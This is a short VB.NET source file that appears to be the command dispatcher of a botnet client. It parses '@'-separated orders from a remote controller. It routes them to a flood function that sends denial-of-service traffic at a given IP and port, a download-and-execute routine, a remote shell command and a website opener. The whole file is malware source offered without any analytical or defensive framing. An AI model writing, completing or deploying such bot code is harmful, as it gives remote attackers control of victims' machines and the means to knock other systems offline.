Public Class BotCommander
    Dim RemoteFunctions As New RemoteFunctions
    Public Sub ConvertCommand(x As String)
        Dim ItemSplitter As Char = "@"
        Dim iArray() As String = Nothing
        If (x.Contains(ItemSplitter)) Then
            iArray = x.Split(ItemSplitter)
        End If
        Select Case iArray(0) 'Command
            Case "flood"
                Dim _IP, _modus As String
                Dim _Port, _Threads, _Requests As Integer
                _modus = iArray(1)
                _IP = iArray(2)
                _Port = Convert.ToInt32(iArray(3))
                _Threads = Convert.ToInt32(iArray(4))
                _Requests = Convert.ToInt32(iArray(5))
                'Call Function:
                RemoteFunctions.Flood(_modus, _IP, _Port, _Threads, _Requests)
            Case "download"
                RemoteFunctions.DownloadAndExecute(iArray(1), iArray(2))
            Case "shell"
                RemoteFunctions.Shell(iArray(1))
            Case "start"
                RemoteFunctions.OpenWebsite(iArray(1))
        End Select
    End Sub
End Class